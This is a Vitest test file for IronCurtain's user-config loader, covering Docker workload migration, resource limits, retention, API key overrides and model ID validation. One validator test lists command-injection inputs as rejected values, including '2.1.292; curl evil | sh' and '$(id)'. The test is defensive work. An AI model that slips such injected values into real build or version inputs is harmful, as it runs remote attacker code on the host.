import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { spawn } from 'node:child_process';
import {
  existsSync,
  mkdtempSync,
  rmSync,
  readFileSync,
  readdirSync,
  writeFileSync,
  mkdirSync,
  statSync,
  chmodSync,
  lstatSync,
  symlinkSync,
} from 'node:fs';
import { basename, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { pathToFileURL } from 'node:url';
import {
  findUnknownUserConfigFields,
  loadUserConfig,
  loadRequestedDockerWorkloadConfig,
  loadRequestedResourceBudgetConfig,
  loadSavedSignalContainerConfig,
  looseModelId,
  qualifiedModelId,
  resourceBudgetFieldsSchema,
  saveUserConfig,
  userConfigSchema,
  validateModelId,
  validateWorkflowModelId,
  resolveActiveProfile,
  resolveLlmInteractionLogMode,
  USER_CONFIG_DEFAULTS,
  RETENTION_CONFIG_DEFAULTS,
  DOCKER_MIN_PIDS_LIMIT,
  MAX_CONCURRENT_AGENT_SESSIONS_LIMIT,
  DEFAULT_MODEL_MAP,
  DEFAULT_GLM_SLUG,
  DEFAULT_GLM_FLASH_SLUG,
} from '../src/config/user-config.js';
import type { ResolvedOpenRouterProfile } from '../src/config/user-config.js';

/** Env var names that need save/restore between tests. */
const ENV_VARS_TO_ISOLATE = [
  'IRONCURTAIN_HOME',
  'ANTHROPIC_API_KEY',
  'ANTHROPIC_BASE_URL',
  'OPENAI_BASE_URL',
  'GOOGLE_API_BASE_URL',
  'GOOGLE_GENERATIVE_AI_API_KEY',
  'OPENAI_API_KEY',
  'OPENROUTER_API_KEY',
] as const;

describe('loadUserConfig', () => {
  let testHome: string;
  const savedEnv: Record<string, string | undefined> = {};

  beforeEach(() => {
    testHome = mkdtempSync(resolve(tmpdir(), 'ironcurtain-userconfig-'));
    // Save and clear all env vars that affect config loading
    for (const key of ENV_VARS_TO_ISOLATE) {
      savedEnv[key] = process.env[key];
      delete process.env[key];
    }
    process.env.IRONCURTAIN_HOME = testHome;
  });

  afterEach(() => {
    // Restore all saved env vars
    for (const key of ENV_VARS_TO_ISOLATE) {
      if (savedEnv[key] !== undefined) {
        process.env[key] = savedEnv[key];
      } else {
        delete process.env[key];
      }
    }
    rmSync(testHome, { recursive: true, force: true });
  });

  it('returns defaults when config file does not exist', () => {
    const config = loadUserConfig();

    expect(config.agentModelId).toBe(USER_CONFIG_DEFAULTS.agentModelId);
    expect(config.policyModelId).toBe(USER_CONFIG_DEFAULTS.policyModelId);
    expect(config.escalationTimeoutSeconds).toBe(USER_CONFIG_DEFAULTS.escalationTimeoutSeconds);
    expect(config.anthropicApiKey).toBe('');
    expect(config.dockerWorkload).toEqual({ enabled: false });
    expect(config.statistics).toEqual({ enabled: true, retentionDays: 90 });
  });

  it('reads the validated requested Docker-workload block without creating or resolving config', () => {
    const configPath = resolve(testHome, 'config.json');
    expect(loadRequestedDockerWorkloadConfig()).toBeUndefined();
    expect(existsSync(configPath)).toBe(false);

    writeConfigFile({
      dockerWorkload: { enabled: false, imageIngress: 'preloaded-only' },
    });
    expect(loadRequestedDockerWorkloadConfig()).toEqual({
      enabled: false,
      networkAccess: 'offline',
    });
  });

  it('keeps nested Docker authority off by default and conservatively migrates an enabled no-choice block', () => {
    writeConfigFile({
      dockerWorkload: { enabled: true },
    });
    const configPath = resolve(testHome, 'config.json');
    const before = readFileSync(configPath, 'utf-8');
    expect(loadUserConfig({ readOnly: true }).dockerWorkload).toMatchObject({
      enabled: true,
      networkAccess: 'images',
    });
    expect(readFileSync(configPath, 'utf-8')).toBe(before);

    expect(loadUserConfig().dockerWorkload).toMatchObject({
      enabled: true,
      networkAccess: 'images',
      acceptObservedDiskRisk: true,
      resources: { memoryMb: USER_CONFIG_DEFAULTS.dockerResources.memoryMb, diskMb: null },
    });
    const written = JSON.parse(readFileSync(configPath, 'utf-8'));
    expect(written.dockerWorkload).toEqual({ enabled: true, networkAccess: 'images' });
  });

  it('does not backfill a disabled no-choice network preference', () => {
    writeConfigFile({ dockerWorkload: { enabled: false } });
    expect(loadRequestedDockerWorkloadConfig()).toEqual({ enabled: false });
    expect(loadUserConfig({ readOnly: true }).dockerWorkload).toEqual({ enabled: false });
    expect(loadUserConfig().dockerWorkload).toEqual({ enabled: false });
    const written = JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8'));
    expect(written.dockerWorkload).toEqual({ enabled: false });
  });

  it('normalizes superseded public access to packages without rewriting read-only loads', () => {
    writeConfigFile({ dockerWorkload: { enabled: false, networkAccess: 'public' } });
    const configPath = resolve(testHome, 'config.json');
    const before = readFileSync(configPath, 'utf-8');

    expect(loadRequestedDockerWorkloadConfig()).toEqual({ enabled: false, networkAccess: 'packages' });
    expect(loadUserConfig({ readOnly: true }).dockerWorkload).toEqual({ enabled: false });
    expect(readFileSync(configPath, 'utf-8')).toBe(before);

    expect(loadUserConfig().dockerWorkload).toEqual({ enabled: false });
    const written = JSON.parse(readFileSync(configPath, 'utf-8'));
    expect(written.dockerWorkload).toEqual({ enabled: false, networkAccess: 'packages' });
  });

  it('inherits numeric Docker resources while keeping safe nested fallbacks for unlimited values', () => {
    writeConfigFile({
      dockerResources: { memoryMb: 6144, cpus: 3 },
      dockerWorkload: { enabled: true },
    });
    expect(loadUserConfig().dockerWorkload).toMatchObject({
      enabled: true,
      resources: { memoryMb: 6144, cpus: 3 },
    });

    writeConfigFile({
      dockerResources: { memoryMb: null, cpus: null },
      dockerWorkload: { enabled: true },
    });
    expect(loadUserConfig().dockerWorkload).toMatchObject({
      enabled: true,
      resources: { memoryMb: 4096, cpus: 2 },
    });
  });

  it('rejects legacy nested resource overrides with their supported replacements', () => {
    writeConfigFile({
      dockerResources: { memoryMb: 6144, cpus: 3 },
      dockerWorkload: { enabled: true, resources: { memoryMb: 10_240, cpus: 6 } },
    });
    expect(() => loadUserConfig()).toThrow(/dockerResources\.memoryMb/u);
    expect(() => loadUserConfig()).toThrow(/dockerResources\.cpus/u);
  });

  it('migrates safe legacy nested-Docker defaults to the canonical network request', () => {
    writeConfigFile({
      dockerWorkload: {
        enabled: true,
        tier: 'developer-only',
        backend: 'apple-container',
        imageMode: 'preloaded-catalog',
        imageIngress: 'preloaded-only',
        daemonState: 'ephemeral',
        hostPortPublishing: false,
        buildEgress: 'disabled',
        acceptObservedDiskRisk: true,
        resources: { pids: { desired: 512, required: false }, diskMb: null },
      },
    });

    expect(loadUserConfig().dockerWorkload).toMatchObject({ enabled: true, networkAccess: 'offline' });
    const written = JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8'));
    expect(written.dockerWorkload).toEqual({ enabled: true, networkAccess: 'offline' });
  });

  it('keeps the nested-Docker daemon share through migration and settings saves, and feeds pidsLimit into the budget', () => {
    writeConfigFile({
      dockerResources: { memoryMb: 6144, cpus: 3, pidsLimit: 8192 },
      dockerWorkload: {
        enabled: true,
        imageIngress: 'preloaded-only',
        resources: { daemonShare: 0.6, pids: { desired: 512, required: false } },
      },
    });

    expect(loadUserConfig().dockerWorkload).toMatchObject({
      enabled: true,
      resources: { memoryMb: 6144, cpus: 3, daemonShare: 0.6, pids: { desired: 8192, required: false } },
    });
    const configPath = resolve(testHome, 'config.json');
    expect(JSON.parse(readFileSync(configPath, 'utf-8')).dockerWorkload).toEqual({
      enabled: true,
      networkAccess: 'offline',
      resources: { daemonShare: 0.6 },
    });
    // The settings editors write only the toggle and network choice.
    saveUserConfig({ dockerWorkload: { enabled: true, networkAccess: 'images' } });
    expect(JSON.parse(readFileSync(configPath, 'utf-8')).dockerWorkload).toEqual({
      enabled: true,
      networkAccess: 'images',
      resources: { daemonShare: 0.6 },
    });
  });

  it('accepts safe legacy nested-Docker defaults without rewriting during read-only loads', () => {
    const legacy = {
      enabled: false,
      backend: 'apple-container',
      imageMode: 'preloaded-catalog',
      imageIngress: 'preloaded-only',
    } as const;
    writeConfigFile({ dockerWorkload: legacy });
    const configPath = resolve(testHome, 'config.json');
    const before = readFileSync(configPath, 'utf-8');

    expect(loadUserConfig({ readOnly: true }).dockerWorkload).toEqual({ enabled: false });
    expect(readFileSync(configPath, 'utf-8')).toBe(before);
  });

  it('rejects raw nested Docker mounts, images, capabilities, and runtime arguments', () => {
    for (const field of ['mounts', 'image', 'capAdd', 'runtimeArgs']) {
      writeConfigFile({ dockerWorkload: { enabled: true, [field]: ['unsafe'] } });
      expect(() => loadUserConfig()).toThrow(/dockerWorkload/u);
    }
  });

  it('resolves the snapshot size cap: no cap by default, an explicit byte count, or null', () => {
    expect(loadUserConfig().snapshot.maxBytes).toBeNull();
    writeConfigFile({ snapshot: { maxBytes: 20 * 1024 * 1024 * 1024 } });
    expect(loadUserConfig().snapshot).toMatchObject({ enabled: true, maxBytes: 20 * 1024 * 1024 * 1024 });
    writeConfigFile({ snapshot: { maxBytes: null } });
    expect(loadUserConfig().snapshot.maxBytes).toBeNull();
    for (const maxBytes of [0, -1, 1.5]) {
      expect(userConfigSchema.safeParse({ snapshot: { maxBytes } }).success).toBe(false);
    }
  });

  it('preserves an explicit statistics disable toggle', () => {
    writeConfigFile({ statistics: { enabled: false, retentionDays: null } });
    expect(loadUserConfig().statistics).toEqual({ enabled: false, retentionDays: null });
  });

  it("defaults observability.llmInteractionLog to 'metadata' and writes it to a new config file", () => {
    expect(loadUserConfig().observability).toEqual({ llmInteractionLog: 'metadata' });
    expect(readConfigFromDisk().observability).toEqual({ llmInteractionLog: 'metadata' });
  });

  it('backfills observability.llmInteractionLog into an existing config file', () => {
    writeConfigFile({ agentModelId: 'claude-opus-4-6' });
    const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);
    try {
      expect(loadUserConfig().observability?.llmInteractionLog).toBe('metadata');
    } finally {
      stderrSpy.mockRestore();
    }
    expect(readConfigFromDisk().observability).toEqual({ llmInteractionLog: 'metadata' });
  });

  it.each(['off', 'metadata', 'full'] as const)('accepts observability.llmInteractionLog %s', (mode) => {
    writeConfigFile({ observability: { llmInteractionLog: mode } });
    expect(loadUserConfig().observability).toEqual({ llmInteractionLog: mode });
  });

  it('rejects an unknown observability.llmInteractionLog value', () => {
    writeConfigFile({ observability: { llmInteractionLog: 'verbose' } });
    expect(() => loadUserConfig()).toThrow(/observability\.llmInteractionLog/);
  });

  it("resolves the log mode of a hand-built config without observability to 'metadata'", () => {
    expect(resolveLlmInteractionLogMode({})).toBe('metadata');
    expect(resolveLlmInteractionLogMode({ observability: { llmInteractionLog: 'off' } })).toBe('off');
  });

  it('resolves the cron settings: no run limit and no catch-up by default, explicit values kept', () => {
    expect(loadUserConfig({ readOnly: true }).cron).toEqual({ maxConcurrentRuns: null, catchUpMissedRuns: false });

    writeConfigFile({ cron: { maxConcurrentRuns: 2, catchUpMissedRuns: true } });
    expect(loadUserConfig().cron).toEqual({ maxConcurrentRuns: 2, catchUpMissedRuns: true });
    // Not backfilled into the file: an absent block keeps meaning the defaults.
    writeConfigFile({});
    loadUserConfig();
    expect(JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8')).cron).toBeUndefined();
  });

  it('rejects a cron run limit that is not a positive integer', () => {
    for (const maxConcurrentRuns of [0, -1, 1.5, 'two']) {
      writeConfigFile({ cron: { maxConcurrentRuns } });
      expect(() => loadUserConfig()).toThrow(/cron\.maxConcurrentRuns/u);
    }
  });

  it('resolves the retention settings: defaults, explicit values, and null as no limit', () => {
    expect(loadUserConfig({ readOnly: true }).retention).toEqual(RETENTION_CONFIG_DEFAULTS);
    expect(RETENTION_CONFIG_DEFAULTS).toMatchObject({
      autoPrune: false,
      sessions: { maxAgeDays: 30, maxBytes: null },
      workflowRuns: { maxAgeDays: 30, maxBytes: null },
      jobRuns: { maxRecords: 200 },
      dependencyCaches: { maxUnusedDays: 14 },
    });

    writeConfigFile({
      retention: {
        autoPrune: true,
        autoPruneIntervalHours: 6,
        sessions: { maxAgeDays: 7, maxBytes: 10_000_000_000 },
        workflowRuns: { maxAgeDays: null },
        jobRuns: { maxRecords: 50 },
        dependencyCaches: { maxUnusedDays: null },
        logs: { maxBytes: null },
      },
    });
    expect(loadUserConfig().retention).toEqual({
      autoPrune: true,
      autoPruneIntervalHours: 6,
      sessions: { maxAgeDays: 7, maxBytes: 10_000_000_000 },
      workflowRuns: { maxAgeDays: null, maxBytes: null },
      jobRuns: { maxRecords: 50 },
      dependencyCaches: { maxUnusedDays: null },
      logs: { maxBytes: null, maxFiles: RETENTION_CONFIG_DEFAULTS.logs.maxFiles },
    });
    // Not backfilled into the file: an absent block keeps meaning the defaults.
    writeConfigFile({});
    loadUserConfig();
    expect(JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8')).retention).toBeUndefined();
  });

  it('rejects retention limits that are out of range', () => {
    const invalid: [Record<string, unknown>, RegExp][] = [
      [{ sessions: { maxAgeDays: 0 } }, /retention\.sessions\.maxAgeDays/u],
      [{ workflowRuns: { maxBytes: -1 } }, /retention\.workflowRuns\.maxBytes/u],
      [{ jobRuns: { maxRecords: 0 } }, /retention\.jobRuns\.maxRecords/u],
      [{ logs: { maxBytes: 1024 } }, /retention\.logs\.maxBytes/u],
      [{ logs: { maxFiles: 0 } }, /retention\.logs\.maxFiles/u],
      [{ autoPrune: 'yes' }, /retention\.autoPrune/u],
      [{ autoPruneIntervalHours: 0 }, /retention\.autoPruneIntervalHours/u],
    ];
    for (const [retention, pattern] of invalid) {
      writeConfigFile({ retention });
      expect(() => loadUserConfig()).toThrow(pattern);
    }
  });

  it('auto-creates config file with defaults when missing', () => {
    loadUserConfig();

    const configPath = resolve(testHome, 'config.json');
    const content = JSON.parse(readFileSync(configPath, 'utf-8'));
    expect(content.agentModelId).toBe(USER_CONFIG_DEFAULTS.agentModelId);
    expect(content.policyModelId).toBe(USER_CONFIG_DEFAULTS.policyModelId);
    expect(content.escalationTimeoutSeconds).toBe(USER_CONFIG_DEFAULTS.escalationTimeoutSeconds);
    expect(content.statistics).toEqual(USER_CONFIG_DEFAULTS.statistics);
    // anthropicApiKey intentionally omitted from auto-created file
    expect(content.anthropicApiKey).toBeUndefined();
  });

  it('creates a missing IronCurtain home with owner-only permissions', () => {
    const missingHome = resolve(testHome, 'missing-home');
    process.env.IRONCURTAIN_HOME = missingHome;

    loadUserConfig();

    expect(statSync(missingHome).mode & 0o777).toBe(0o700);
  });

  it('logs creation message to stderr when auto-creating', () => {
    const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);

    loadUserConfig();

    expect(stderrSpy).toHaveBeenCalledWith(expect.stringContaining('Created default config at'));
    stderrSpy.mockRestore();
  });

  it('parses valid config and merges with defaults', () => {
    writeConfigFile({ agentModelId: 'claude-opus-4-6' });

    const config = loadUserConfig();

    expect(config.agentModelId).toBe('claude-opus-4-6');
    // Other fields should use defaults
    expect(config.policyModelId).toBe(USER_CONFIG_DEFAULTS.policyModelId);
    expect(config.escalationTimeoutSeconds).toBe(USER_CONFIG_DEFAULTS.escalationTimeoutSeconds);
  });

  it('reads all fields from config file', () => {
    writeConfigFile({
      agentModelId: 'claude-opus-4-6',
      policyModelId: 'claude-haiku-3-5',
      anthropicApiKey: 'sk-test-config-key',
      escalationTimeoutSeconds: 60,
    });

    const config = loadUserConfig();

    expect(config.agentModelId).toBe('claude-opus-4-6');
    expect(config.policyModelId).toBe('claude-haiku-3-5');
    expect(config.anthropicApiKey).toBe('sk-test-config-key');
    expect(config.escalationTimeoutSeconds).toBe(60);
  });

  it('ANTHROPIC_API_KEY env var overrides config file anthropicApiKey', () => {
    writeConfigFile({ anthropicApiKey: 'sk-from-config' });
    process.env.ANTHROPIC_API_KEY = 'sk-from-env';

    const config = loadUserConfig();

    expect(config.anthropicApiKey).toBe('sk-from-env');
  });

  it('uses config file anthropicApiKey when env var is not set', () => {
    writeConfigFile({ anthropicApiKey: 'sk-from-config' });
    delete process.env.ANTHROPIC_API_KEY;

    const config = loadUserConfig();

    expect(config.anthropicApiKey).toBe('sk-from-config');
  });

  it('throws on invalid JSON', () => {
    writeRawConfigFile('{ invalid json }');

    expect(() => loadUserConfig()).toThrow(/Invalid JSON/);
  });

  it('throws on invalid agentModelId (empty string)', () => {
    writeConfigFile({ agentModelId: '' });

    expect(() => loadUserConfig()).toThrow(/agentModelId/);
  });

  it('throws on invalid escalationTimeoutSeconds (too low)', () => {
    writeConfigFile({ escalationTimeoutSeconds: 10 });

    expect(() => loadUserConfig()).toThrow(/escalationTimeoutSeconds/);
  });

  it('throws on invalid escalationTimeoutSeconds (too high)', () => {
    writeConfigFile({ escalationTimeoutSeconds: 1000 });

    expect(() => loadUserConfig()).toThrow(/escalationTimeoutSeconds/);
  });

  it('throws on invalid escalationTimeoutSeconds (not integer)', () => {
    writeConfigFile({ escalationTimeoutSeconds: 60.5 });

    expect(() => loadUserConfig()).toThrow(/escalationTimeoutSeconds/);
  });

  it('throws on invalid field type (number for agentModelId)', () => {
    writeRawConfigFile(JSON.stringify({ agentModelId: 123 }));

    expect(() => loadUserConfig()).toThrow(/agentModelId/);
  });

  it('schema rejects non-finite dockerResources values', () => {
    // Infinity/NaN can land in the resolved object via interactive prompts
    // before serialization (JSON.stringify would later turn them into `null`,
    // silently flipping a huge value into "unlimited"). The schema must
    // reject these at the boundary.
    expect(userConfigSchema.safeParse({ dockerResources: { cpus: Infinity } }).success).toBe(false);
    expect(userConfigSchema.safeParse({ dockerResources: { cpus: NaN } }).success).toBe(false);
    expect(userConfigSchema.safeParse({ dockerResources: { memoryMb: Infinity } }).success).toBe(false);
    expect(userConfigSchema.safeParse({ dockerResources: { memoryMb: NaN } }).success).toBe(false);
  });

  it('bounds agent container processes by default and accepts an explicit pids ceiling or opt-out', () => {
    expect(USER_CONFIG_DEFAULTS.dockerResources.pidsLimit).toBe(4096);
    writeConfigFile({ dockerResources: { memoryMb: 6144 } });
    expect(loadUserConfig().dockerResources).toEqual({ memoryMb: 6144, cpus: 4, pidsLimit: 4096 });

    writeConfigFile({ dockerResources: { pidsLimit: 1024 } });
    expect(loadUserConfig().dockerResources.pidsLimit).toBe(1024);

    writeConfigFile({ dockerResources: { pidsLimit: null } });
    expect(loadUserConfig().dockerResources.pidsLimit).toBeNull();
  });

  it('keeps agent sudo on unless the config disables it, and never backfills the default (DINF-3)', () => {
    const configPath = resolve(testHome, 'config.json');
    writeConfigFile({ agentModelId: 'anthropic:claude-sonnet-4-6' });
    expect(loadUserConfig().agentSudo).toBe(true);
    // Not frozen into the file: changing the Linux default stays an owner decision.
    expect(JSON.parse(readFileSync(configPath, 'utf-8'))).not.toHaveProperty('agentSudo');
    expect(USER_CONFIG_DEFAULTS).not.toHaveProperty('agentSudo');

    writeConfigFile({ agentSudo: false });
    expect(loadUserConfig().agentSudo).toBe(false);
    expect(userConfigSchema.safeParse({ agentSudo: 'no' }).success).toBe(false);
  });

  it('pins agent CLIs unless agentCliVersions overrides them, and never backfills an override', () => {
    const configPath = resolve(testHome, 'config.json');
    writeConfigFile({ agentModelId: 'anthropic:claude-sonnet-4-6' });
    expect(loadUserConfig().agentCliVersions).toEqual({});
    expect(JSON.parse(readFileSync(configPath, 'utf-8'))).not.toHaveProperty('agentCliVersions');
    expect(USER_CONFIG_DEFAULTS).not.toHaveProperty('agentCliVersions');

    writeConfigFile({ agentCliVersions: { 'claude-code': 'latest', codex: '0.160.1' } });
    expect(loadUserConfig().agentCliVersions).toEqual({ 'claude-code': 'latest', codex: '0.160.1' });
  });

  it('accepts only "latest" or an exact version for an agent CLI, for known agents', () => {
    for (const good of ['latest', '2.1.292', '1.0.0-beta.2']) {
      expect(userConfigSchema.safeParse({ agentCliVersions: { 'claude-code': good } }).success, good).toBe(true);
    }
    // The value reaches a shell in the image build: no ranges, tags or metacharacters.
    for (const bad of ['', 'next', '^2.1.0', '2.1', '2.1.292; curl evil | sh', '$(id)', 7]) {
      expect(userConfigSchema.safeParse({ agentCliVersions: { codex: bad } }).success, String(bad)).toBe(false);
    }
    // Goose installs a release binary and has no override; typos are errors, not ignored.
    expect(userConfigSchema.safeParse({ agentCliVersions: { goose: '1.27.0' } }).success).toBe(false);
    expect(userConfigSchema.safeParse({ agentCliVersions: { claude_code: 'latest' } }).success).toBe(false);
  });

  it('rejects pids ceilings that could not run an agent or are not integers', () => {
    expect(userConfigSchema.safeParse({ dockerResources: { pidsLimit: DOCKER_MIN_PIDS_LIMIT } }).success).toBe(true);
    for (const bad of [DOCKER_MIN_PIDS_LIMIT - 1, 0, -1, 100.5, Infinity, NaN]) {
      expect(userConfigSchema.safeParse({ dockerResources: { pidsLimit: bad } }).success).toBe(false);
    }
  });

  it('caps concurrent workflow agent environments at 4 by default and accepts an explicit cap', () => {
    expect(USER_CONFIG_DEFAULTS.maxConcurrentAgentSessions).toBe(4);
    writeConfigFile({});
    expect(loadUserConfig().maxConcurrentAgentSessions).toBe(4);

    writeConfigFile({ maxConcurrentAgentSessions: 12 });
    expect(loadUserConfig().maxConcurrentAgentSessions).toBe(12);
  });

  it('rejects an agent concurrency cap that is not a positive integer up to the limit', () => {
    expect(
      userConfigSchema.safeParse({ maxConcurrentAgentSessions: MAX_CONCURRENT_AGENT_SESSIONS_LIMIT }).success,
    ).toBe(true);
    // No "unlimited": null is not accepted either.
    for (const bad of [0, -1, 2.5, MAX_CONCURRENT_AGENT_SESSIONS_LIMIT + 1, Infinity, NaN, null]) {
      expect(userConfigSchema.safeParse({ maxConcurrentAgentSessions: bad }).success).toBe(false);
    }
  });

  it('warns about unknown fields to stderr', () => {
    writeConfigFile({ unknownField: 'value' });
    const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);

    loadUserConfig();

    expect(stderrSpy).toHaveBeenCalledWith(expect.stringContaining('unknown field "unknownField"'));
    stderrSpy.mockRestore();
  });

  it('does not throw on unknown fields', () => {
    writeConfigFile({ extraField: true, anotherExtra: 42 });

    // Should not throw, just warn
    expect(() => loadUserConfig()).not.toThrow();
  });

  it('missing optional fields use defaults', () => {
    writeConfigFile({});

    const config = loadUserConfig();

    expect(config.agentModelId).toBe(USER_CONFIG_DEFAULTS.agentModelId);
    expect(config.policyModelId).toBe(USER_CONFIG_DEFAULTS.policyModelId);
    expect(config.escalationTimeoutSeconds).toBe(USER_CONFIG_DEFAULTS.escalationTimeoutSeconds);
    expect(config.anthropicApiKey).toBe('');
  });

  it('accepts boundary escalation timeout values', () => {
    writeConfigFile({ escalationTimeoutSeconds: 30 });
    expect(loadUserConfig().escalationTimeoutSeconds).toBe(30);

    writeConfigFile({ escalationTimeoutSeconds: 600 });
    expect(loadUserConfig().escalationTimeoutSeconds).toBe(600);
  });

  it('creates parent directory if it does not exist', () => {
    const nestedHome = resolve(testHome, 'nested', 'deep');
    process.env.IRONCURTAIN_HOME = nestedHome;

    const config = loadUserConfig();

    expect(config.agentModelId).toBe(USER_CONFIG_DEFAULTS.agentModelId);
    // Verify file was created in nested directory
    const content = readFileSync(resolve(nestedHome, 'config.json'), 'utf-8');
    expect(JSON.parse(content)).toHaveProperty('agentModelId');
  });

  it('includes config path in error messages', () => {
    writeRawConfigFile('not json');

    expect(() => loadUserConfig()).toThrow(resolve(testHome, 'config.json'));
  });

  // --- New API key fields ---

  it('new API key fields default to empty string', () => {
    const config = loadUserConfig();

    expect(config.googleApiKey).toBe('');
    expect(config.openaiApiKey).toBe('');
  });

  it('reads googleApiKey and openaiApiKey from config file', () => {
    writeConfigFile({
      googleApiKey: 'test-google-key',
      openaiApiKey: 'test-openai-key',
    });

    const config = loadUserConfig();

    expect(config.googleApiKey).toBe('test-google-key');
    expect(config.openaiApiKey).toBe('test-openai-key');
  });

  it('GOOGLE_GENERATIVE_AI_API_KEY env var overrides config googleApiKey', () => {
    writeConfigFile({ googleApiKey: 'from-config' });
    process.env.GOOGLE_GENERATIVE_AI_API_KEY = 'from-env';

    const config = loadUserConfig();

    expect(config.googleApiKey).toBe('from-env');
  });

  it('OPENAI_API_KEY env var overrides config openaiApiKey', () => {
    writeConfigFile({ openaiApiKey: 'from-config' });
    process.env.OPENAI_API_KEY = 'from-env';

    const config = loadUserConfig();

    expect(config.openaiApiKey).toBe('from-env');
  });

  // --- Base URL env var validation ---

  it('throws when ANTHROPIC_BASE_URL is malformed', () => {
    // The schema validates `anthropicBaseUrl` from the config file via
    // `z.url()`; the env override must apply the same rule rather than
    // accepting whatever string is in the environment. Without this guard,
    // a typo'd env var would surface as an opaque fetch failure mid-session.
    process.env.ANTHROPIC_BASE_URL = 'not-a-url';
    expect(() => loadUserConfig()).toThrow(/ANTHROPIC_BASE_URL/);
  });

  it('throws when OPENAI_BASE_URL is malformed', () => {
    process.env.OPENAI_BASE_URL = 'definitely-not-a-url';
    expect(() => loadUserConfig()).toThrow(/OPENAI_BASE_URL/);
  });

  it('throws when GOOGLE_API_BASE_URL is malformed', () => {
    process.env.GOOGLE_API_BASE_URL = '://broken';
    expect(() => loadUserConfig()).toThrow(/GOOGLE_API_BASE_URL/);
  });

  it('accepts a well-formed ANTHROPIC_BASE_URL env var', () => {
    process.env.ANTHROPIC_BASE_URL = 'https://openrouter.ai/anthropic';
    const config = loadUserConfig();
    expect(config.anthropicBaseUrl).toBe('https://openrouter.ai/anthropic');
  });

  it('leaves anthropicBaseUrl as the config-file value when ANTHROPIC_BASE_URL is empty', () => {
    writeConfigFile({ anthropicBaseUrl: 'https://example.invalid/anthropic' });
    delete process.env.ANTHROPIC_BASE_URL;
    const config = loadUserConfig();
    expect(config.anthropicBaseUrl).toBe('https://example.invalid/anthropic');
  });

  // --- Qualified model ID validation ---

  it('accepts qualified model IDs with known providers', () => {
    writeConfigFile({ agentModelId: 'anthropic:claude-sonnet-4-6' });
    expect(() => loadUserConfig()).not.toThrow();

    writeConfigFile({ agentModelId: 'google:gemini-2.0-flash' });
    expect(() => loadUserConfig()).not.toThrow();

    writeConfigFile({ agentModelId: 'openai:gpt-4o' });
    expect(() => loadUserConfig()).not.toThrow();
  });

  it('accepts bare model IDs (no colon prefix)', () => {
    writeConfigFile({ agentModelId: 'claude-sonnet-4-6' });
    expect(() => loadUserConfig()).not.toThrow();
  });

  it('rejects model IDs with unknown provider prefix', () => {
    writeConfigFile({ agentModelId: 'unknown:model-id' });

    expect(() => loadUserConfig()).toThrow(/provider/i);
  });

  it('rejects policyModelId with unknown provider prefix', () => {
    writeConfigFile({ policyModelId: 'mistral:model-id' });

    expect(() => loadUserConfig()).toThrow(/provider/i);
  });

  it('leaves policyVerifierModelId unset by default and never writes it into a new config', () => {
    expect(loadUserConfig().policyVerifierModelId).toBeUndefined();
    const written = JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8')) as Record<string, unknown>;
    expect(written).not.toHaveProperty('policyVerifierModelId');
  });

  it('reads policyVerifierModelId and validates it like the other model IDs', () => {
    writeConfigFile({ policyVerifierModelId: 'openai:gpt-5' });
    expect(loadUserConfig().policyVerifierModelId).toBe('openai:gpt-5');

    writeConfigFile({ policyVerifierModelId: 'mistral:model-id' });
    expect(() => loadUserConfig()).toThrow(/provider/i);
  });

  it('defaults include anthropic: prefix', () => {
    expect(USER_CONFIG_DEFAULTS.agentModelId).toMatch(/^anthropic:/);
    expect(USER_CONFIG_DEFAULTS.policyModelId).toMatch(/^anthropic:/);
  });

  // --- Backfill missing fields ---

  it('backfills missing top-level fields while preserving user values', () => {
    writeConfigFile({ agentModelId: 'claude-opus-4-6' });

    const config = loadUserConfig();
    expect(config.agentModelId).toBe('claude-opus-4-6');

    const onDisk = readConfigFromDisk();
    expect(onDisk.agentModelId).toBe('claude-opus-4-6');
    expect(onDisk.escalationTimeoutSeconds).toBe(USER_CONFIG_DEFAULTS.escalationTimeoutSeconds);
    expect(onDisk.resourceBudget).toEqual(USER_CONFIG_DEFAULTS.resourceBudget);
    expect(onDisk.autoCompact).toEqual(USER_CONFIG_DEFAULTS.autoCompact);
  });

  it('backfills missing nested sub-fields in existing objects', () => {
    writeConfigFile({ resourceBudget: { maxSteps: 100 } });

    loadUserConfig();

    const onDisk = readConfigFromDisk();
    const budget = onDisk.resourceBudget as Record<string, unknown>;
    expect(budget.maxSteps).toBe(100);
    expect(budget.maxTotalTokens).toBe(USER_CONFIG_DEFAULTS.resourceBudget.maxTotalTokens);
    expect(budget.warnThresholdPercent).toBe(USER_CONFIG_DEFAULTS.resourceBudget.warnThresholdPercent);
  });

  it('does not backfill sensitive fields (anthropicApiKey, googleApiKey, openaiApiKey)', () => {
    writeConfigFile({ agentModelId: 'claude-opus-4-6' });

    loadUserConfig();

    const onDisk = readConfigFromDisk();
    expect(onDisk.anthropicApiKey).toBeUndefined();
    expect(onDisk.googleApiKey).toBeUndefined();
    expect(onDisk.openaiApiKey).toBeUndefined();
  });

  it('is idempotent — no write when file already has all fields', () => {
    // First call creates and backfills
    loadUserConfig();
    const configPath = resolve(testHome, 'config.json');
    const contentAfterFirst = readFileSync(configPath, 'utf-8');

    const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);
    loadUserConfig();
    stderrSpy.mockRestore();

    const contentAfterSecond = readFileSync(configPath, 'utf-8');
    expect(contentAfterSecond).toBe(contentAfterFirst);
    // Should not log backfill message on second call
    expect(stderrSpy).not.toHaveBeenCalledWith(expect.stringContaining('Backfilled config fields'));
  });

  it('logs added fields to stderr during backfill', () => {
    writeConfigFile({ agentModelId: 'claude-opus-4-6' });
    const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);

    loadUserConfig();

    expect(stderrSpy).toHaveBeenCalledWith(expect.stringContaining('Backfilled config fields'));
    stderrSpy.mockRestore();
  });

  it('preserves JSON formatting (2-space indent, trailing newline)', () => {
    writeConfigFile({ agentModelId: 'claude-opus-4-6' });

    loadUserConfig();

    const raw = readFileSync(resolve(testHome, 'config.json'), 'utf-8');
    expect(raw).toMatch(/^\{/);
